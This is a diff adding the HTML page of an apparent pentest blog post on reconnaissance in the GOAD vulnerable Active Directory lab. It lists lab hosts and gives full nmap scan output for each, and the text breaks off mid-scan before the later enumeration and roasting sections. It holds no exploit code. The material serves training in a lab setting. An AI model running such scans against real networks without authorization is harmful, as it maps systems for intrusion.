@@ -1,0 +1,1341 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>Game of Active Directory - Part 2 [Recon] - Dcodezero</title>
+<meta name="description" content="GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="Game of Active Directory - Part 2 [Recon]">
+<meta property="og:url" content="http://localhost:4000/goad/GOAD-p2/">
+
+
+  <meta property="og:description" content="GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/sample/GOAD/GOAD.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-12-07T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/goad/GOAD-p2/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Think I Helped You?</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/sample/GOAD/GOAD.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          Game of Active Directory - Part 2 [Recon]
+
+        
+      </h1>
+      
+        <p class="page__lead">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-07T00:00:00+05:30">December 7, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          16 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+        <p>
+        
+          <a href="/goad/GOAD-p1" class="btn btn--light-outline btn--large">Part 1</a>
+        
+        </p>
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#goad" itemprop="item"><span itemprop="name">Goad</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">Game of Active Directory - Part 2 [Recon]</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Game of Active Directory - Part 2 [Recon]">
+    <meta itemprop="description" content="GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.">
+    <meta itemprop="datePublished" content="2024-12-07T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#enumerate-network">Enumerate Network</a><ul><li><a href="#nmap-scanning-the-whole-ad-range">Nmap Scanning the whole AD range</a></li><li><a href="#list-of-ips-assigned-to-vms">list of IPs assigned to VMs</a><ul><li><a href="#scan-results-from-kingslandingsevenkingdomslocal-1721610050">Scan results from kingslanding.sevenkingdoms.local [172.16.100.50]</a></li><li><a href="#scan-results-from-winterfellnorthsevenkingdomslocal-1721610051">Scan results from winterfell.north.sevenkingdoms.local [172.16.100.51]</a></li><li><a href="#scan-results-from-meereenessoslocal-1721610052">Scan results from meereen.essos.local [172.16.100.52]</a></li><li><a href="#scan-results-from-castelblacknorthsevenkingdomslocal-1721610022">Scan results from castelblack.north.sevenkingdoms.local [172.16.100.22]</a></li><li><a href="#scan-results-from-braavosessoslocal-1721610023">Scan results from braavos.essos.local [172.16.100.23]</a></li><li><a href="#recon-with-crackmapexec">Recon with CrackmapExec:</a></li><li><a href="#modifying-the-etchosts-file-to-update-dns">Modifying the /etc/hosts file to update DNS</a></li></ul></li><li><a href="#enumerating-with-enum4linux">Enumerating with Enum4linux</a></li><li><a href="#time-to-roast">Time to Roast</a></li></ul></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="enumerate-network">Enumerate Network</h2>
+<p>We’ll start enumerating the network</p>
+<h3 id="nmap-scanning-the-whole-ad-range">Nmap Scanning the whole AD range</h3>
+
+<h3 id="list-of-ips-assigned-to-vms">list of IPs assigned to VMs</h3>
+
+<p>IP address assigned / configured to each machine/s at the time of LAB deployment.</p>
+<ol>
+  <li>172.16.100.50 - DC-01 <code class="language-plaintext highlighter-rouge">kingslanding.sevenkingdoms.local</code></li>
+  <li>172.16.100.51 - DC-02 <code class="language-plaintext highlighter-rouge">winterfell.north.sevenkingdoms.local</code></li>
+  <li>172.16.100.52 -DC-03 <code class="language-plaintext highlighter-rouge">meereen.essos.local</code></li>
+  <li>172.16.100.22 -SRVC-02 <code class="language-plaintext highlighter-rouge">castelblack.north.sevenkingdoms.local</code></li>
+  <li>172.16.100.23 -SRVC-03 <code class="language-plaintext highlighter-rouge">braavos.essos.local</code></li>
+</ol>
+
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-pnsv.png" alt="SCR-20241208-pnsv.png" /></p>
+
+<h4 id="scan-results-from-kingslandingsevenkingdomslocal-1721610050">Scan results from <code class="language-plaintext highlighter-rouge">kingslanding.sevenkingdoms.local</code> [172.16.100.50]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 07:50 EST
+Nmap scan report for 172.16.100.50
+Host is up (0.0010s latency).
+Not shown: 987 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 17:20:32Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SEVENKINGDOMS
+|   NetBIOS_Domain_Name: SEVENKINGDOMS
+|   NetBIOS_Computer_Name: KINGSLANDING
+|   DNS_Domain_Name: sevenkingdoms.local
+|   DNS_Computer_Name: kingslanding.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-02T17:21:11+00:00
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:04:51
+|_Not valid after:  2025-04-28T13:04:51
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+MAC Address: BC:24:11:7B:95:CB (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-12-02T17:21:12
+|_  start_date: N/A
+|_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m57s
+|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:7b:95:cb (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.02 ms 172.16.100.50
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.82 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-winterfellnorthsevenkingdomslocal-1721610051">Scan results from <code class="language-plaintext highlighter-rouge">winterfell.north.sevenkingdoms.local</code> [172.16.100.51]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:27 EST
+Nmap scan report for 172.16.100.51
+Host is up (0.00052s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 14:57:24Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:29:25
+|_Not valid after:  2025-04-28T13:29:25
+| rdp-ntlm-info: 
+|   Target_Name: NORTH
+|   NetBIOS_Domain_Name: NORTH
+|   NetBIOS_Computer_Name: WINTERFELL
+|   DNS_Domain_Name: north.sevenkingdoms.local
+|   DNS_Computer_Name: winterfell.north.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-08T14:58:03+00:00
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+MAC Address: BC:24:11:35:B3:38 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-12-08T14:58:04
+|_  start_date: N/A
+|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:35:b3:38 (unknown)
+|_clock-skew: mean: 4h29m59s, deviation: 0s, median: 4h29m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms 172.16.100.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.59 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-meereenessoslocal-1721610052">Scan results from <code class="language-plaintext highlighter-rouge">meereen.essos.local</code> [172.16.100.52]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:35 EST
+Nmap scan report for 172.16.100.52
+Host is up (0.00059s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 15:05:54Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Not valid before: 2024-10-27T13:06:14
+|_Not valid after:  2025-04-28T13:06:14
+| rdp-ntlm-info: 
+|   Target_Name: ESSOS
+|   NetBIOS_Domain_Name: ESSOS
+|   NetBIOS_Computer_Name: MEEREEN
+|   DNS_Domain_Name: essos.local
+|   DNS_Computer_Name: meereen.essos.local
+|   DNS_Tree_Name: essos.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2024-12-08T15:06:34+00:00
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+MAC Address: BC:24:11:D6:47:02 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: Host: MEEREEN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 4h23m19s, deviation: 20m00s, median: 4h29m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: meereen
+|   NetBIOS computer name: MEEREEN\x00
+|   Domain name: essos.local
+|   Forest name: essos.local
+|   FQDN: meereen.essos.local
+|_  System time: 2024-12-08T16:06:34+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_nbstat: NetBIOS name: MEEREEN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:d6:47:02 (unknown)
+| smb2-time: 
+|   date: 2024-12-08T15:06:34
+|_  start_date: 2024-12-08T10:10:37
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms 172.16.100.52
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.57 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-castelblacknorthsevenkingdomslocal-1721610022">Scan results from <code class="language-plaintext highlighter-rouge">castelblack.north.sevenkingdoms.local</code> [172.16.100.22]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:37 EST
+Nmap scan report for 172.16.100.22
+Host is up (0.00051s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-12-08T15:08:00+00:00; +4h29m59s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: NORTH
+|   NetBIOS_Domain_Name: NORTH
+|   NetBIOS_Computer_Name: CASTELBLACK
+|   DNS_Domain_Name: north.sevenkingdoms.local
+|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-08T15:07:54+00:00
+| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:44:15
+|_Not valid after:  2025-04-28T13:44:15
+MAC Address: BC:24:11:24:FC:63 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-12-08T15:07:54
+|_  start_date: N/A
+|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:24:fc:63 (unknown)
+|_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.50 ms 172.16.100.22
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-braavosessoslocal-1721610023">Scan results from <code class="language-plaintext highlighter-rouge">braavos.essos.local</code> [172.16.100.23]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:38 EST
+Nmap scan report for 172.16.100.23
+Host is up (0.00059s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-12-08T15:08:33+00:00; +4h29m59s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: ESSOS
+|   NetBIOS_Domain_Name: ESSOS
+|   NetBIOS_Computer_Name: BRAAVOS
